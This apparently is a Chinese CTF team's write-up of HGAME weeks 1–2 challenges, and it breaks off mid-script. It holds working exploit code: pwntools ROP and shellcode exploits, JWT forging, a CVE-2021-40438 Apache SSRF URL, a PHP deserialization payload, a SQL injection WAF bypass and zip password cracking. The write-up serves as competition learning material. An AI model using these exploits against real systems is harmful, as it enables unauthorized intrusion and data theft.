[{"content":"week1 [Web]Fujiwara Tofu Shop  By SSGSS\n 一个个改请求头就 ok\nGET / HTTP/1.1\rHost: game.summ3r.top\rUser-Agent: Hachi-Roku\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\rAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\rAccept-Encoding: gzip, deflate\rConnection: close\rGasoline: 100\rCookie: flavor=Raspberry;\rUpgrade-Insecure-Requests: 1\rCache-Control: max-age=0\rReferer: qiumingshan.net\rX-Real-IP: 127.0.0.1\r[Web]Tetris plus  By SSGSS\n 一个个翻 js，长度最长的那个用 js 运行一下就是 flag\n[Web]蛛蛛\u0026hellip;嘿嘿♥我的蛛蛛  By SSGSS\n 爬虫题\nimport requests import re url = \u0026#39;https://hgame-spider.vidar.club/b7412bb0b0\u0026#39; now = \u0026#39;?key=M7H8z1oG%2B1SaPudvsDf7GEm%2F9hyalx2liQ6X2mBSz4iXDqmZwkyLTWPY02GWc5OZf%2F9zO73pRTg3XdoyjfgY3g%3D%3D\u0026#39; while True: r = requests.get(url + now) try: now = re.search(r\u0026#39;\\?key=.*?\u0026#34;\u0026#39;, r.text)[0][:-1] except: print(now) break 到最后一关查看 header 就有 flag\n[Web]easy_auth  By SSGSS\n 根据题目描述要 admin 登进去，阅读 app.js 代码发现是用 jwt 进行的身份认证，介于是 week1 的简单题，没必要想的那么复杂，先尝试把 algorithm 改成 None 后无效，那就爆弱口令密钥，网上找了个 top10000，脚本如下：\nimport jwt jwt_str = \u0026#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJJRCI6MzUwLCJVc2VyTmFtZSI6ImFkbWluJyBvciAxMDAwMD0xMDAwMCMiLCJQaG9uZSI6IiIsIkVtYWlsIjoiIiwiZXhwIjoxNjQyNzMyMTQ1LCJpc3MiOiJNSmNsb3VkcyJ9._VVQjP4wTBYNes1cWiIaNTTidLwirfaFA9pnqsC-eQ8\u0026#39; fp = open(\u0026#39;弱口令top10000.txt\u0026#39;,\u0026#39;r\u0026#39;) for line in fp.readlines(): line = line.replace(\u0026#39;\\n\u0026#39;, \u0026#39;\u0026#39;) # print(line) try: jwt.decode(jwt_str, verify=True, key=line) print(line) print(len(line)) break except (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError): print(line) break except jwt.exceptions.InvalidSignatureError: continue 爆出来密钥为空，所以伪造 jwt:\ndict = {\u0026#34;ID\u0026#34;:1,\u0026#34;UserName\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;Phone\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;Email\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;exp\u0026#34;:1642732145,\u0026#34;iss\u0026#34;:\u0026#34;MJclouds\u0026#34;} print(jwt.encode(dict, \u0026#39;\u0026#39;, algorithm=\u0026#39;HS256\u0026#39;)) 然后到控制台里把 token 改了就能拿 flag 了。localStorage.setItem('token',value)\n[Pwn]gdb  By triplewings\n  触发 gets 漏洞，拿到 shell  from pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) # p = remote(\u0026#34;chuj.top\u0026#34;, 50684) p = process(\u0026#34;./a.out\u0026#34;) p.recvuntil(b\u0026#34;word\u0026#34;) payload = p64(0xb0361e0e8294f147) + p64(0x8c09e0c34ed8a6a9) p.send(payload) p.recvuntil(b\u0026#34;\\x7f\u0026#34;) p.recv(2) canary = u64(p.recv(8)) print(hex(canary)) p.send(b\u0026#34;a\u0026#34;*24 + p64(canary) + b\u0026#34;a\u0026#34;*8 + p64(0x401256)) p.interactive() [Pwn]enter_the_pwn_land  By triplewings\n  baby rop，改 puts  from pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) p = process(\u0026#34;./a.out\u0026#34;) # p = remote(\u0026#34;chuj.top\u0026#34;, 31470) libc = ELF(\u0026#34;libc-2.31.so\u0026#34;) pop_rdi = 0x0000000000401313 pop_rsi_r15 = 0x0000000000401311 puts_got = 0x404020 puts_plt = 0x401090 payload = b\u0026#34;a\u0026#34;*44 + b\u0026#34;\\x2c\u0026#34; + b\u0026#34;\\x00\u0026#34;*3 + b\u0026#34;a\u0026#34;*8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(0x4011B6) + b\u0026#34;\\n\u0026#34; # gdb.attach(p, \u0026#34;b *0x4011B6\u0026#34;) p.send(payload) p.recvuntil(b\u0026#34;\\n\u0026#34;) libc.address = u64(p.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8, b\u0026#34;\\x00\u0026#34;)) - libc.sym[\u0026#34;puts\u0026#34;] print(hex(libc.address)) sh = libc.search(b\u0026#39;/bin/sh\u0026#39;).__next__() system = libc.sym[\u0026#39;execv\u0026#39;] payload2 = b\u0026#34;b\u0026#34;*44 + b\u0026#34;\\x2c\u0026#34; + b\u0026#34;\\x00\u0026#34;*3 + b\u0026#34;c\u0026#34;*8 + p64(pop_rsi_r15) + p64(0)*2 +p64(pop_rdi) + p64(sh) +p64(system) + b\u0026#34;\\n\u0026#34; p.send(payload2) p.interactive() [Pwn]enter_the_evil_pwn_land  By triplewings\n  利用多线程 canary 和 tls 离 stack 近的特点覆盖 canary  from pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) p = process(\u0026#34;./a.out\u0026#34;) # p = remote(\u0026#34;chuj.top\u0026#34;, 31470) libc = ELF(\u0026#34;libc-2.31.so\u0026#34;) pop_rdi = 0x0000000000401313 pop_rsi_r15 = 0x0000000000401311 puts_got = 0x404020 puts_plt = 0x401090 payload = b\u0026#34;a\u0026#34;*44 + b\u0026#34;\\x2c\u0026#34; + b\u0026#34;\\x00\u0026#34;*3 + b\u0026#34;a\u0026#34;*8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(0x4011B6) + b\u0026#34;\\n\u0026#34; # gdb.attach(p, \u0026#34;b *0x4011B6\u0026#34;) p.send(payload) p.recvuntil(b\u0026#34;\\n\u0026#34;) libc.address = u64(p.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8, b\u0026#34;\\x00\u0026#34;)) - libc.sym[\u0026#34;puts\u0026#34;] print(hex(libc.address)) sh = libc.search(b\u0026#39;/bin/sh\u0026#39;).__next__() system = libc.sym[\u0026#39;execv\u0026#39;] payload2 = b\u0026#34;b\u0026#34;*44 + b\u0026#34;\\x2c\u0026#34; + b\u0026#34;\\x00\u0026#34;*3 + b\u0026#34;c\u0026#34;*8 + p64(pop_rsi_r15) + p64(0)*2 +p64(pop_rdi) + p64(sh) +p64(system) + b\u0026#34;\\n\u0026#34; p.send(payload2) p.interactive() [Pwn]oldfashion_orw  By triplewings\n  ban 了 openat，用 getsdent64 读取目录，然后正常 orw  from pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) p = process(\u0026#34;vuln\u0026#34;) p = remote(\u0026#34;chuj.top\u0026#34;, 41765) libc = ELF(\u0026#34;libc-2.31.so\u0026#34;) def proof(y): may = string.ascii_letters+string.digits for i in may: for j in may: for k in may: for l in may: res = i +j +k +l if hashlib.sha256((res).encode()).hexdigest() == y: p.sendline(res) return print(\u0026#39;Wrong!\u0026#39;) p.recvuntil(b\u0026#34; == \u0026#34;) a = p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1].decode() print(a) proof(a) p.recvuntil(\u0026#34;size?\u0026#34;) p.sendline(\u0026#34;-1\u0026#34;) p.recvuntil(\u0026#34;content?\u0026#34;) # gdb.attach(p, \u0026#34;b *0x401311\u0026#34;) pop_rdi = 0x0000000000401443 pop_rsi_r15 = 0x0000000000401441 write_got = 0x404018 write_plt = 0x401080 main = 0x401311 leave = 0x4013DB read_plt = 0x4010A0 bss = 0x404060 + 0x100 payload = b\u0026#34;a\u0026#34;*40 + p64(0xffffffffffffffff) + p64(bss) payload += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(bss) + p64(0) + p64(read_plt) + p64(main) p.send(payload) p.recvuntil(\u0026#34;done!\u0026#34;) payload2 = p32(main) + b\u0026#34;\\x00\u0026#34;*2 p.send(payload2) p.recvuntil(\u0026#34;size?\\n\u0026#34;) p.sendline(b\u0026#34;-1\u0026#34;) p.recvuntil(\u0026#34;content?\u0026#34;) payload = b\u0026#34;a\u0026#34;*40 + p64(0xffffffffffffffff) + p64(bss-0x8) payload += p64(pop_rsi_r15) + p64(write_got) + p64(0) + p64(write_plt) + p64(leave) + p64(main) p.send(payload) libc.address = u64(p.recvuntil(b\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8, b\u0026#34;\\x00\u0026#34;)) - libc.sym[\u0026#34;write\u0026#34;] print(hex(libc.address)) p.recvuntil(\u0026#34;size?\u0026#34;) p.sendline(\u0026#34;-1\u0026#34;) p.recvuntil(\u0026#34;content?\u0026#34;) libc_pop_rax = 0x000000000004a550 libc_pop_rax_rdx_rbx = 0x0000000000162865 libc_pop_rdx_r12 = 0x000000000011c371 libc_pop_rcx = 0x000000000009f822 payload = b\u0026#34;./\u0026#34; + b\u0026#34;\\x00\u0026#34;*14 + b\u0026#34;a\u0026#34;*0x18 + p64(0xffffffffffffffff) + b\u0026#34;a\u0026#34;*8 payload += p64(libc.address + libc_pop_rax_rdx_rbx) + p64(2) + p64(0) + p64(0) + p64(pop_rdi) + p64(0x404130) + p64(pop_rsi_r15) + p64(0) + p64(0) + p64(libc.sym[\u0026#34;alarm\u0026#34;] + 9) payload += p64(pop_rdi) + p64(3) + p64(pop_rsi_r15) + p64(0x404280) + p64(0) payload += p64(libc_pop_rdx_r12 + libc.address) + p64(0x200) + p64(0) payload += p64(libc_pop_rcx + libc.address) +p64(0x404280 + 0x200) payload += p64(libc.sym[\u0026#34;getdents64\u0026#34;]) payload += p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(0x404280) + p64(0) + p64(libc_pop_rdx_r12 + libc.address) + p64(0x200) + p64(0) + p64(libc.sym[\u0026#34;write\u0026#34;]) + p64(main) p.send(payload) p.recvuntil(b\u0026#34;done\u0026#34;) p.recvuntil(b\u0026#34;flag\u0026#34;) tail = p.recv(20) # tail = b\u0026#34;a74248296b5d7f3d2b01\u0026#34; p.recvuntil(\u0026#34;size?\u0026#34;) p.sendline(\u0026#34;-1\u0026#34;) p.recvuntil(\u0026#34;content?\u0026#34;) payload = b\u0026#34;./flag\u0026#34; + tail + b\u0026#34;\\x00\u0026#34;*6 + b\u0026#34;a\u0026#34;*8 + p64(0xffffffffffffffff) + b\u0026#34;a\u0026#34;*8 payload += p64(libc.address + libc_pop_rax_rdx_rbx) + p64(2) + p64(0) + p64(0) + p64(pop_rdi) + p64(0x404228) + p64(pop_rsi_r15) + p64(0) + p64(0) + p64(libc.sym[\u0026#34;alarm\u0026#34;] + 9) payload += p64(pop_rdi) + p64(4) + p64(pop_rsi_r15) + p64(bss- 0xc0) + p64(0) + p64(libc.address+libc_pop_rdx_r12) + p64(0x100) + p64(0) payload += p64(libc.sym[\u0026#34;read\u0026#34;]) payload += p64(pop_rdi) + p64(1) + p64(libc.sym[\u0026#34;write\u0026#34;]) p.sendline(payload) p.interactive() [RE]easyasm  By hidden\n 考察8086汇编。\n汇编编写，不能f5；加密较为简单；了解代码段、数据段的知识，看懂段寄存器的对应（其实猜也才出来了），看懂加密的核心逻辑即可。\nt=[0x91, 0x61, 0x01, 0xc1, 0x41, 0xa0, 0x60, 0x41, 0x01, 0x21, 0x14, 0xc, 0xe2, 0x54, 0x20, 0xc1, 0xe2, 0x60, 0x14, 0x30, 0xd1, 0x51, 0xc0, 0x17] for j in range(len(t)): for i in range(256): if (((i\u0026lt;\u0026lt;4)%256+(i\u0026gt;\u0026gt;4))^0x17==t[j]): print (chr(i), end=\u0026#39;\u0026#39;) [RE]creakme  By s0uthwood\n int __cdecl main(int argc, const char **argv, const char **envp) { int v3; // edx  int i; // esi  unsigned int v5; // edi  unsigned int v6; // ebx  int v7; // esi  int v8; // esi  _DWORD v10[17]; // [esp+Ch] [ebp-8Ch] BYREF  _BYTE v11[32]; // [esp+50h] [ebp-48h]  char Arglist[32]; // [esp+70h] [ebp-28h] BYREF  int v13; // [esp+90h] [ebp-8h]  int v14; // [esp+94h] [ebp-4h]  memset(Arglist, 0, sizeof(Arglist)); sub_40103A(\u0026#34;%s\u0026#34;, (char)Arglist); strcpy((char *)v10, \u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\u0026#34;); v3 = 0; v14 = 0; for ( i = 0; i \u0026lt; 32; v14 = i ) { v5 = *(_DWORD *)\u0026amp;Arglist[i]; v6 = *(_DWORD *)\u0026amp;Arglist[i + 4]; v13 = 0; v7 = 32; do { v3 += 0x12345678; v5 += v3 ^ (v3 + v6) ^ (v10[2] + 16 * v6) ^ (v10[3] + (v6 \u0026gt;\u0026gt; 5)); v6 += v3 ^ (v3 + v5) ^ (v10[0] + 16 * v5) ^ (v10[1] + (v5 \u0026gt;\u0026gt; 5)); --v7; } while ( v7 ); v8 = v14; v3 = 0; *(_DWORD *)\u0026amp;Arglist[v14] = v5; *(_DWORD *)\u0026amp;Arglist[v8 + 4] = v6; i = v8 + 8; } *(_OWORD *)v11 = *(_OWORD *)dword_402180; *(_OWORD *)\u0026amp;v11[16] = dword_402170; while ( Arglist[v3] == v11[v3] ) { if ( ++v3 \u0026gt;= 32 ) { sub_40100C(\u0026#34;right!\u0026#34;, v10[0]); return 0; } } sub_40100C(\u0026#34;wrong!\u0026#34;, v10[0]); return 0; } 那一串字符串看似和 Base64 有关，其实加密就是 TEA\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdint.h\u0026gt; void decrypt (uint32_t* v, uint32_t* k) { uint32_t delta=0x12345678; uint32_t v0=v[0], v1=v[1], sum=delta * 32, i; uint32_t k0=k[0], k1=k[1], k2=k[2], k3=k[3]; for (i=0; i\u0026lt;32; i++) { v1 -= sum ^ ((v0\u0026lt;\u0026lt;4) + k0) ^ (v0 + sum) ^ ((v0\u0026gt;\u0026gt;5) + k1); v0 -= sum ^ ((v1\u0026lt;\u0026lt;4) + k2) ^ (v1 + sum) ^ ((v1\u0026gt;\u0026gt;5) + k3); sum -= delta; } v[0]=v0; v[1]=v1; } int main() { uint32_t v[]={1222194312u, 51123276u, 1391163586u, 3986482669u, 2921328102u, 3126465133u, 3482485930u, 1709241059u},k[4]={0x44434241,0x48474645,0x4c4b4a49,0x504f4e4d}; decrypt(v, k); decrypt(v + 2, k); decrypt(v + 4, k); decrypt(v + 8, k); printf(\u0026#34;%s\u0026#34;, v); return 0; } [RE]Flag Checker  By s0uthwood\n jeb 打开\npackage com.example.flagchecker; import android.os.Bundle; import android.support.v7.app.AppCompatActivity; import android.util.Base64; import android.view.View.OnClickListener; import android.view.View; import android.widget.Button; import android.widget.EditText; import android.widget.Toast; import javax.crypto.Cipher; import javax.crypto.spec.SecretKeySpec; public class MainActivity extends AppCompatActivity { public static byte[] encrypt(String arg4, String arg5) throws Exception { SecretKeySpec v0 = new SecretKeySpec(arg5.getBytes(), 0, arg5.length(), \u0026#34;RC4\u0026#34;); Cipher v5 = Cipher.getInstance(\u0026#34;RC4\u0026#34;); v5.init(1, v0); return v5.doFinal(arg4.getBytes()); } @Override // android.support.v7.app.AppCompatActivity  protected void onCreate(Bundle arg2) { super.onCreate(arg2); this.setContentView(0x7F09001C); // layout:activity_main  ((Button)this.findViewById(0x7F070022)).setOnClickListener(new View.OnClickListener() { // id:button  @Override // android.view.View$OnClickListener  public void onClick(View arg4) { String v4 = ((EditText)MainActivity.this.findViewById(0x7F070036)).getText().toString(); // id:editTextTextPersonName  byte[] v2 = new byte[0]; try { v2 = MainActivity.encrypt(v4, \u0026#34;carol\u0026#34;); } catch(Exception v4_1) { v4_1.printStackTrace(); } if(Base64.encodeToString(v2, 0).replace(\u0026#34;\\n\u0026#34;, \u0026#34;\u0026#34;).equals(\u0026#34;mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s=\u0026#34;)) { Toast.makeText(MainActivity.this, \u0026#34;Congratulations!!!\u0026#34;, 1).show(); return; } Toast.makeText(MainActivity.this, \u0026#34;Fail,try again.\u0026#34;, 1).show(); } }); } } RC4 + Base64\nfrom base64 import * from Crypto.Cipher import ARC4 cipher = b64decode(b\u0026#39;mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s=\u0026#39;) key = b\u0026#39;carol\u0026#39; rc4 = ARC4.new(key) rc4.decrypt(cipher) # b\u0026#39;hgame{weLC0ME_To-tHE_WORLD_oF-AnDr0|D}\u0026#39; [RE]猫头鹰是不是猫  By SSGSS\n 总结一下快捷键：\n d改byte，dword，qword shift+e导出数据 y重新定义数据类型 *数组  看懂逻辑后，做个矩阵乘法求逆即可。\nint n=64; double a[66][66],b[66][66],c[66][130],f[64]; void gauss(double (*A)[130]) { for(int i=0;i\u0026lt;n;i++) { int k=i; for(int j=i+1;j\u0026lt;n;j++)if(A[j][i]\u0026gt;A[k][i])k=j; double del=A[k][i]; if(fabs(del=A[k][i])\u0026lt;eps)puts(\u0026#34;no\u0026#34;); for(int j=i;j\u0026lt;2*n;j++)swap(A[i][j],A[k][j]); for(int j=i;j\u0026lt;2*n;j++)A[i][j]/=del; for(int j=0;j\u0026lt;n;j++) if(j!=i) { del=A[j][i]; for(int k=i;k\u0026lt;2*n;k++)A[j][k]-=A[i][k]*del; } } } int main() { for(int i=0;i\u0026lt;n;i++) for(int j=0;j\u0026lt;n;j++){ a[i][j]=dword_4140[i*n+j]/10; b[i][j]=dword_8140[i*n+j]/10; } for(int i=0;i\u0026lt;n;i++) for(int j=0;j\u0026lt;n;j++) for(int k=0;k\u0026lt;n;k++)c[i][j]+=a[i][k]*b[k][j]; for(int i=0;i\u0026lt;n;i++)c[i][i+n]=1; gauss(c); for(int i=0;i\u0026lt;n;i++) for (int j=0;j\u0026lt;n;j++) f[i]+=ini[j]*c[j][i+n]; for(int i=0;i\u0026lt;n;i++) printf(\u0026#34;%c\u0026#34;,char(int(floor(f[i]+0.5)))); return 0; } [Crypto]Dancing Line [Crypto]Matryohska  By NULLPointer\n 下载压缩包，解压得到一个名为 Matryoshka.txt 的文件，里面的内容为 Braille（盲文）加密，使用盲文破解网站 https://unicode-table.com/cn/tools/braille/ 解密：\n\r\n此时发现解密得到的字符共有三种：-，/，和 ⠨，猜测下一层为 Morse 密码。用 . 替换 ⠨ 后使用Morse密码解密网站 https://www.bejson.com/enc/morse/ 得到：\n\r\n得到的字符串显然不是正确形式。注意到每两个字符由一个逗号间隔，而逗号的 Morse 编码为一段回文字符串 --..--。联想到题目中出现的“纸条背面”的提示，尝试将字符串倒转处理。此时逗号位置的 Morse 编码仍为 --..--。解码得到：\n\r\n发现是 Hex 编码，使用 Python 编写脚本解密得到一段 Base64 字符串：\nb =[0x46,0x66,0x42,0x75,0x66,0x45,0x46,0x6E,0x6D,0x4C,0x73,0x36,0x44,0x33,0x73,0x69,0x59,0x74,0x4C,0x36,0x58,0x32,0x70,0x34,0x69,0x4E,0x30,0x63,0x64,0x53,0x6C,0x79,0x6B,0x6D,0x39,0x72,0x51,0x4E,0x39,0x6F,0x4D,0x53,0x31,0x6A,0x6B,0x73,0x39,0x72,0x4B,0x32,0x52,0x36,0x6B,0x4C,0x38,0x68,0x6F,0x72,0x30,0x3D] flag = \u0026#34;\u0026#34; for i in b: flag += chr(i) print(flag) # \u0026#34;FfBufEFnmLs6D3siYtL6X2p4iN0cdSlykm9rQN9oMS1jks9rK2R6kL8hor0=\u0026#34; 解码 Base64 时系统报错，说明得到的只是一个 Base64 形式的字符串。题目中的 “Caesar:21; Vigenère: hgame” 提示 flag 经历了偏移量为 21 的凯撒加密和 key 为 hgame 的维吉尼亚加密，因此编写脚本尝试破解，发现最终加密算法为：flag -\u0026gt; 22位栅栏 -\u0026gt; 21位凯撒 -\u0026gt; 密钥为 hgame 的维吉尼亚，逆向解密即可：\n//Vigenère #include\u0026lt;stdio.h\u0026gt;#include\u0026lt;string.h\u0026gt; char key[105], sd[1005]; int main() { gets(key); gets(sd); int i,ptr; for(i=1;i\u0026lt;=strlen(key);i++) { if(key[i-1]\u0026gt;=65\u0026amp;\u0026amp;key[i-1]\u0026lt;=90) key[i-1]+=32; } ptr=1; for(i=1;i\u0026lt;=strlen(sd);i++) { if(sd[i-1]\u0026gt;=65\u0026amp;\u0026amp;sd[i-1]\u0026lt;=90) { if(sd[i-1]-key[ptr-1]+\u0026#39;a\u0026#39;\u0026gt;=65) { sd[i-1]=sd[i-1]-key[ptr-1]+\u0026#39;a\u0026#39;; ptr++; } else { sd[i-1]=sd[i-1]-key[ptr-1]+\u0026#39;a\u0026#39;+26; ptr++; } } else if(sd[i-1]\u0026gt;=97\u0026amp;\u0026amp;sd[i-1]\u0026lt;=122) { if(sd[i-1]-key[ptr-1]+\u0026#39;a\u0026#39;\u0026gt;=97) { sd[i-1]=sd[i-1]-key[ptr-1]+\u0026#39;a\u0026#39;; ptr++; } else { sd[i-1]=sd[i-1]-key[ptr-1]+\u0026#39;a\u0026#39;+26; ptr++; } } if(ptr\u0026gt;strlen(key)) { ptr=1; } } for(i=1;i\u0026lt;=strlen(sd);i++) { printf(\u0026#34;%c\u0026#34;,sd[i-1]); } } // \u0026#34;YzBibXZnaHl6X3swUmF6X2d4eG0wdGhrem9fMG9iMG1fdm9rY2N6dF8hcn0=\u0026#34; def deCaesar(string,move): s = \u0026#34;\u0026#34; for i in string: if ord(i) \u0026gt;= 65 and ord(i) \u0026lt;= 90: if (ord(i) - ord(\u0026#39;A\u0026#39;) - move) \u0026gt;= 0: s += chr(ord(i) - move) else: s += chr(ord(i) - move + 26) elif ord(i) \u0026gt;= 97 and ord(i) \u0026lt;= 122: if (ord(i) - ord(\u0026#39;a\u0026#39;) - move) \u0026gt;= 0: s += chr(ord(i) - move) else: s += chr(ord(i) - move + 26) else: s += i return s def deFence(string,space): s = \u0026#34;\u0026#34; if len(string) % space == 0: key = len(string) // space else: key = len(string) // space + 1 for i in range(0, key): for j in range(i, len(string), key): if j \u0026lt; len(string): s += string[j] return s import base64 temp = \u0026#34;YzBibXZnaHl6X3swUmF6X2d4eG0wdGhrem9fMG9iMG1fdm9rY2N6dF8hcn0=\u0026#34; flag = base64.b64decode(temp).decode(\u0026#34;utf-8\u0026#34;) for i in range(1,50): print(deFence(deCaesar(flag, 21), i)) # i = 22 # \u0026#34;hgame{Welc0me_t0_the_w0rld_0f_crypt0graphy!}\u0026#34; [Crypto]Easy RSA [Crypto]English Novel [Misc]这个压缩包有点麻烦  By NULLPointer\n 下载题目，得到一个加密的压缩包，打开后发现提示：\n\r\n猜测第一层压缩包的密码是 6 位数字，属于弱口令，可以通过暴力破解得到压缩包口令。使用压缩包爆破工具 ARCHPR，设置口令为 6 位数字，暴力破解，得到压缩包密码为 483279。\n\r\n解压得到 flag.zip，README.md 和 password-note.txt 三个文件，其中 flag.zip 是加密的压缩包，README.md 中发现提示：\n\r\n推测给出的密码本 password-note.txt 中存在压缩包的密码，因此使用字典爆破得到口令：\n\r\n第二层压缩包解压后得到第三个加密的压缩包 flag.zip 和一个 README.md 文件。将 md 文件压缩后在 WinRAR 中查看，发现其 CRC32 值和 flag.zip 中的 README.md 文件 CRC32 值相同。于是推测这两个文件可能是同一文件，因此使用明文爆破的方式攻击。\n明文爆破时 ARCHPR 报错，说明这两个 README.md 文件是不完整的文件。使用 github 上的工具 bkcrack 进行不完整明文攻击，得到部分口令并直接分离出图片 flag.zip。\n使用 HexEditor 查看图片，发现其中有 zip 格式的开始字段 50 4B 03 04 和结束字段 50 4B 05 06。\n\r\n使用 binwalk 工具分离得到一个加密的压缩包，用 HexEditor 查看发现数据标志位和目录标志位均为 09 00，猜测使用了伪加密并将其改为 00 00，发现压缩包内文件解密，即可得到 flag。\n[Misc]好康的流量  By NULLPointer\n Wireshark查看流量包，发现协议仅有 TCP 与 SMTP 两种，其中 TCP 建立通信，SMTP 用于传输文件。由题目提示可知流量包中可能含有一张图片。\n追踪 TCP 流发现一小段 Base64 编码，解密发现提示可能用到 LSB 隐写。\n\r\n\r\nTCP 流中还存在一大段 Base64 编码，Content-Type: image/png 提示这段编码即为传输的图片，使用 Base64 转图片工具 https://tool.jisuapi.com/base642pic.html 得到传输的图片。\n\r\n\r\n使用 Stegsolve 查看图片各个通道，在 Green2 通道中发现条形码，扫描得到 flag 的前半段。\n\r\n利用 Data Extract 工具检查 LSB 隐写情况，最终发现当设置 Bit Planes：Red0，Green0，Blue0，Extracted By：Column，Bit Order：LSB First 时得到 flag 后半段。\n\r\n[Misc]群青(其实是幽灵东京)  By NULLPointer\n ​下载题目给出的 wav 文件，放入 Audacity，查看频谱图发现信息：\n\r\n​查看文件属性，在“详细信息”一栏中发现提示：why not try try SilentEye。\n\r\n​这些信息提示可能存在 SilentEye 隐写。使用 SilentEye 中的 Encrypted 方式解密，设置密钥为 Yoasobi，得到一个新的 wav 文件。\n\r\n​文件名 S_S_T_V.wav 提示为 SSTV 隐写，使用 robot36 分析得到一张含有二维码的图片，扫描即可得到 flag。\n\r\n[IOT]饭卡的 uno  By SSGSS\n 用 hex2bin 转换，然后 strings 拿到 flag。\n s0uthwood: 补充一下 .hex 文件格式\n    冒号 本行数据长度 本行数据在文件中的起始地址 数据类型 数据 校验码     : 1 byte 2 byte 1 byte N byte 1 byte    week2 [Web]webpack-engine  By SSGSS\n webpack,看f12前端的源码即可。\n[Web]Apache!  By SSGSS\n CVE-2021-40438\nhttp://httpd.summ3r.top:60010/proxy/?unix:[A*5000]|http://internal.host/flag\r[Web]一本单词书  By SSGSS\n 下载下来源码，登录用弱类型绕，后面这个老哥自己手动实现了一个对映射的序列化再反序列化，自己写的肯定有bug\n最终的payload：{\u0026quot;sb|O:4:\\\u0026quot;Evil\\\u0026quot;:2:{s:4:\\\u0026quot;file\\\u0026quot;;s:5:\\\u0026quot;/flag\\\u0026quot;;s:4:\\\u0026quot;flag\\\u0026quot;;N;}aaa\u0026quot;:\u0026quot;2b\u0026quot;}\n[Web]Pokemon  By SSGSS\n sql注入，注入点在报错界面，通过报错能查看出查询语句，同时也能测出waf掉了哪些关键字，可以通过双写绕过，为了方便，就写脚本帮我replace了。\nimport requests url = \u0026#39;http://121.43.141.153:60056/error.php?code=\u0026#39; def bypass(s): s = s.replace(\u0026#39;=\u0026#39;, \u0026#39; like \u0026#39;) s = s.replace(\u0026#39; \u0026#39;, \u0026#39;/*/**/*/\u0026#39;) s = s.replace(\u0026#39;select\u0026#39;, \u0026#39;seleselectct\u0026#39;) s = s.replace(\u0026#39;union\u0026#39;, \u0026#39;ununionion\u0026#39;) s = s.replace(\u0026#39;or\u0026#39;, \u0026#39;oorr\u0026#39;) s = s.replace(\u0026#39;and\u0026#39;, \u0026#39;anandd\u0026#39;) s = s.replace(\u0026#39;from\u0026#39;, \u0026#39;frofromm\u0026#39;) s = s.replace(\u0026#39;where\u0026#39;, \u0026#39;whwhereere\u0026#39;) return s payload = \u0026#34;404 union select 1, database()#\u0026#34; payload = \u0026#34;404 union select database(), group_concat(table_name) from information_schema.tables where table_schema=database()#\u0026#34; payload = \u0026#34;404 union select 1, group_concat(column_name) from information_schema.columns where table_name=\u0026#39;fllllllllaaaaaag\u0026#39;#\u0026#34; payload = \u0026#34;404 union select 1, flag from fllllllllaaaaaag#\u0026#34; payload = bypass(payload) print(payload) r = requests.get(url + payload) print(r.text) [Web]At0m的留言板 [Pwn]blind  By triplewings\n 访问 proc/self/mem 即可修改当前进程的内存， .text 段也是可修改的\nfrom pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) p = remote(\u0026#34;chuj.top\u0026#34;, 51808) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) def proof(y): may = string.ascii_letters+string.digits for i in may: for j in may: for k in may: for l in may: res = i +j +k +l if hashlib.sha256((res).encode()).hexdigest() == y: p.sendline(res) return print(\u0026#39;Wrong!\u0026#39;) p.recvuntil(b\u0026#34; == \u0026#34;) a = p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1].decode() print(a) proof(a) p.recvuntil(\u0026#34;write: \u0026#34;) libc.address = int(p.recvuntil(\u0026#39;\\n\u0026#39;)[:-1], base = 16) - libc.sym[\u0026#34;write\u0026#34;] print(hex(libc.address)) p.sendlineafter(\u0026#34;\u0026gt;\u0026gt; \u0026#34;, b\u0026#39;/proc/self/mem\\x00\u0026#39;) p.sendlineafter(\u0026#34;\u0026gt;\u0026gt; \u0026#34;, str(libc.sym[\u0026#34;__libc_start_main\u0026#34;])) payload = asm(shellcraft.sh()) payload = payload.rjust(0x300, asm(\u0026#39;nop\u0026#39;)) + b\u0026#39;\\n\u0026#39; p.sendafter(\u0026#34;\u0026gt;\u0026gt; \u0026#34;, payload) p.interactive() [Pwn]echo sever  By triplewings\n 堆上的格式化字符串， 打 realloc， og 填到 malloc_hook\nfrom pwn import * context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) p = process(\u0026#34;./echo\u0026#34;) p = remote(\u0026#34;chuj.top\u0026#34;, 52259) libc 